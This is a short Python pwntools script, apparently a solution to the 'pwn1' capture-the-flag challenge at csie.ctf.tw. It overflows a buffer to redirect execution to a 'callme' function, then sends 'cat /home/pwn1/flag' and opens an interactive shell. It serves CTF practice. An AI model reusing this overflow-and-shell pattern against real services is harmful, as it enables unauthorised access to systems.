import time
from pwn import *
LOCAL = False

elf = ELF('pwn1', checksec=False)

PAD = 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa'
payload = PAD + p64(elf.symbols['callme'])

r = None
if LOCAL:
    server = process(['socat', 'tcp-listen:10120,fork,reuseaddr', 'exec:./pwn1'])
    r = remote('localhost', 10120)
    gdb.attach('pwn1', '''
            b *main+22
            c
            ''')
else:
    r = remote('csie.ctf.tw', 10120)

r.sendline(payload)
time.sleep(1)
r.sendline('cat /home/pwn1/flag')

r.interactive()
